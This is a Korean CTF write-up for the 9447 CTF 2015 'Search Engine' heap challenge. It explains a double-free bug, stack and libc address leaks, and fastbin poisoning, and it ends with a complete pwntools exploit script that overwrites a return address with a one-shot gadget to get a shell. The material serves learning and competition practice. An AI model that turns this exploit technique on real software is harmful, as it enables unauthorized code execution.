---
layout: post
title: ! "[9447 CTF 2015] Search Engine"
comments: true
excerpt_separator: <!--more-->
tags:
  - MyriaBreak
  - Write-up
  - CTF
  - pwnable
  - heap
---

요즘 `Heap` 쪽을 공부하고 있습니다. 그래서 `Shellphish`팀에서 정리해놓은 `how2heap`문서를 보면서 공부를 하고 있는데, 처음부터 굉장히 어려운 문제를 잡은 느낌이 듭니다 ;;
이 문제를 본 것은 한달 전이지만 푼 것은 한달 후네요 ㅠ
아무튼 시작했으니 끝을 보긴해야해서 이렇게 write up으로 남겨봅니다.

<!--more-->

![]({{ site.baseurl }}/images/myria/search_engine-writeup/search_01.PNG)

예시가 너무 어렵습니다 `Shellphish`팀... 쉬운 문제없나요 ㅠ

```
Ever wanted to search through real life? Well this won't help, but it will let you search strings.

Find it at search-engine-qgidg858.9447.plumbing port 9447.

```

아무튼 문제는 위와 같습니다. 문자열 검색을 수행하는 바이너리를 하나 던져주는데, 보호기법을 확인해보면 아래와 같습니다.

![]({{ site.baseurl }}/images/myria/search_engine-writeup/search_04.PNG)

`Canary`와 `NX`가 걸려있는데, 일단 한번 실행해보는게 좋을 것 같습니다.

![]({{ site.baseurl }}/images/myria/search_engine-writeup/search_02.PNG)

주어진 바이너리를 실행하게 되면 3가지 메뉴가 주어지고 문자열을 추가(Index), 검색(Search)할 수 있습니다.

![]({{ site.baseurl }}/images/myria/search_engine-writeup/search_03.PNG)

그리고 Search를 통해 단어를 검색하여 그 단어가 포함된 문장을 검색할 수 있고, 또 검색한 후 그 문자열을 삭제할지 말지를 결정할 수 있습니다.

이제 `IDA`를 통해 바이너리의 자세한 과정을 살펴보겠습니다.

![]({{ site.baseurl }}/images/myria/search_engine-writeup/search_05.PNG)

while문안에서 메뉴를 출력하고 어떤 기능을 수행할지 선택하게 됩니다.

![]({{ site.baseurl }}/images/myria/search_engine-writeup/search_08.PNG)

`AddSentence함수`를 살펴보면 위와 같이 구조체를 malloc을 통해 할당하여 입력받은 문장을 저장하는 것을 볼 수 있습니다.

또한 `공백`을 기준으로 word를 나눠서 이를 또 구조체를 malloc으로 할당해서 `Linked list`를 만들게 됩니다.


```c++
struct dic {
    char* word_addr;
    int word_size;
    char* sentence_addr;
    int sentence_size;
    struct dic* next;
};
```
그럼 이제 어디서 취약점이 터지느냐?
아래 `Search`함수를 보면 `memset`을 통해서 `sentence`에 저장된 내용은 NULL(0)으로 모두 지워버리고, `free`를 하는 것을 볼 수 있습니다. 하지만 `word`들이 저장된 `Linked List`에서는 이를 삭제해버리지 않기때문에, NULL값을 검색하게되면 이미 삭제되었던 값을 다시 한번 삭제하고 `free`할 수 있게 되어 `double free bug`가 발생하게 됩니다.

![]({{ site.baseurl }}/images/myria/search_engine-writeup/search_07.PNG)

그러므로 우리는 여기서 fastbin list를 `HEAD -> B -> A -> B` .. 형식으로 만들 수 있고, B를 2번 할당할 수 있으므로 B의 `fd` 값을 수정하여 다음에 할당할 영역의 주소를 임의로 조작할 수 있습니다.

그런데 어디에 있는 값을 수정해야할까요?

![]({{ site.baseurl }}/images/myria/search_engine-writeup/search_10.PNG)

main함수가 끝나는 `ret`에 break를 걸고 스택에 있는 값을 살펴보면 위와 같습니다. 0x40~~이 있는데 이 위치를 잘 조정해서, 아래와 같이해서 fastbin리스트에 넣게되면 0x40을 size로 보고 정상적으로 `fastbin`에 포함되게 됩니다.

![]({{ site.baseurl }}/images/myria/search_engine-writeup/search_11.PNG)

>하지만 저희는 스택값을 모르는데요?

그래서 스택값을 `leak`해야하는데, 이것은 아래 함수를 통해서 할 수 있습니다.

![]({{ site.baseurl }}/images/myria/search_engine-writeup/search_06.PNG)

위 함수는 사용자로부터 숫자를 입력받고, 만약 숫자가 아닌값이 입력된다면 재귀적으로 다시 한번 자기자신을 호출하여 숫자를 입력받을 때까지 계속하게 호출되게 됩니다.
그런데 이 때 2번째 `Select_choice`함수를 호출하게 될 때, 이전 함수의 ebp가 남아있게 되는데 이 위치가 `num+48`에 있기때문에 num을 입력할 때, 문자열 48자리로 채우게 되면 printf로 출력될 때 NULL바이트를 만날때까지 출력되기때문에 스택주소를 leak할 수 있습니다.

![]({{ site.baseurl }}/images/myria/search_engine-writeup/search_12.PNG)

자.. 이제 스택 주소도 구했겠다. 이제 `library주소`만 leak할 수 있다면 완벽할 텐데 말이죠. 그래서 여러가지 알아보던 중에 저희 팀의 `chaem`님이 올린 글을 보게됬는데, 여기서 smallbin을 이용해서 library주소를 leak할 수 있다는 것을 알게 되었습니다.

---
[(0ctf2017) babyheap Write up](https://go-madhat.github.io/0ctfbabyheap-writeup/)에서 나온 smallbin을 이용하는 방법입니다.

#### 6. 그리고 4번 chunk의 크기를 다시 smallbin 크기로 만들어주고 free합니다. free하면 smallbin 특성상 unsorted bin이 되기 때문에 fd와 bk에 main_arena+88 주소가 남게 됩니다. 이 점을 이용하면 dump를 통해 main_arena+88의 leak이 가능합니다.
---

fastbin 이외의 다른 bin들은 free되고 나면 데이터영역에 fd와 bk가 남게되는데, 이 때 다음 fd와 bk를 연결할 chunk가 없다면 libc의 `<main_area+88>`의 주소가 남게됩니다.

![]({{ site.baseurl }}/images/myria/search_engine-writeup/search_14.PNG)
![]({{ site.baseurl }}/images/myria/search_engine-writeup/search_13.PNG)
![]({{ site.baseurl }}/images/myria/search_engine-writeup/search_15.PNG)

자. 이제 `libc_base`도 구했고, `stack_address`도 있으니 `double free bug`를 이용해서 `ret`에 원하는 주소를 쓰면 되겠습니다.

이것을 정리하면 아래와 같습니다.

1. `stack address`, `libc_base` leak
2. `oneshot_gadget` 구하기
3. `ret`를 `oneshot_gadget`으로 덮기

```python
#!/usr/bin/env python
from pwn import *

conn = process("search")

def leak_stack():
	conn.recvuntil("3: Quit")
	conn.sendline("1")
	conn.recvuntil("size:")
	conn.sendline("A")
	conn.recvuntil("number")
	conn.sendline("A"*48)
	stack_addr = conn.recvuntil(" is ")[-10:-4]
	stack_addr = u64(stack_addr + "\x00"*2)
	conn.sendline("1")
	conn.recvuntil("word:")
	conn.sendline("A")
	return stack_addr

def Search(word, size):
	conn.recvuntil("3: Quit")
	conn.sendline("1")
	conn.recvuntil("size:")
	conn.sendline(str(size))
	conn.recvuntil("word:")
	conn.sendline(word)

def Delete(choice):
	conn.recvuntil("(y/n)?")
	conn.sendline(choice)

def AddSentence(sentence, size):
	conn.recvuntil("3: Quit")
	conn.sendline("2")
	conn.recvuntil("size:")
	conn.sendline(str(size))
	conn.recvuntil("sentence:")
	conn.sendline(sentence)

stack_addr = leak_stack() + 0x92 # fake size 0x40
log.info("stack_addr : 0x%x" % stack_addr)

#leak_libc  -  <main_arena+88>
AddSentence("A"*506+" small", 512)
Search("small", 5)
Delete("y")

Search("\0"*5, 5)
conn.recvuntil(": ")
libc_addr = u64(conn.recv(8)) - 0x3c4b78
log.info("libc_addr  : 0x%x" % libc_addr)
Delete("n")

# double free bug
AddSentence("A"*50+" dfb", 54) #A
AddSentence("B"*50+" dfb", 54) #B
AddSentence("C"*50+" dfb", 54) #C

# fastbin HEAD -> A -> B -> C -> NULL
Search("dfb", 3)
Delete("y") #C
Delete("y") #B
Delete("y") #A

# fastbin HEAD -> B -> A -> B -> C -> NULL
Search("\x00"*3, 3)
Delete("y") #B
Delete("n") #A

# fastbin HEAD -> B -> A -> B -> X ...
AddSentence(p64(stack_addr).ljust(54), 54) #B
AddSentence("A"*50+" dfb", 54) #A
AddSentence("A"*50+" dfb", 54) #B

# ret overwrite
oneshot = libc_addr + 0x45216
log.info("oneshot  : 0x%x" % oneshot)

payload = "A"*6
payload += p64(oneshot)
AddSentence(payload.ljust(54), 54) #B

conn.recvuntil("3: Quit")
conn.sendline("3")

conn.interactive()



```

이제 익스코드를 돌려보면 아래와 같이 쉘을 얻은 것을 볼 수 있습니다.

![]({{ site.baseurl }}/images/myria/search_engine-writeup/search_16.PNG)

### *후기

역시 heap은 어렵군요 ㅠㅠ 더 열심히 공부해야겠습니다. 분명 비슷한 문제를 이전에 풀어본거같은데, 할 때마다 heap은 헷갈리는 것 같습니다. 익숙치않아서 그런걸까요 ㅎㅎ;
그리고 저는 pwnalbe문제를 풀 때 주로 peda를 쓰는데, 역시 heap 문제 풀때는 pwndgb가 더 편한것같네요... 다음에 문제를 풀게 되면 한 번 이용해봐야겠습니다. 워낙 익숙하지않아서 후... 다음번에는 좀 더 문제를 빠르게 풀 수 있으면 좋겠습니다!
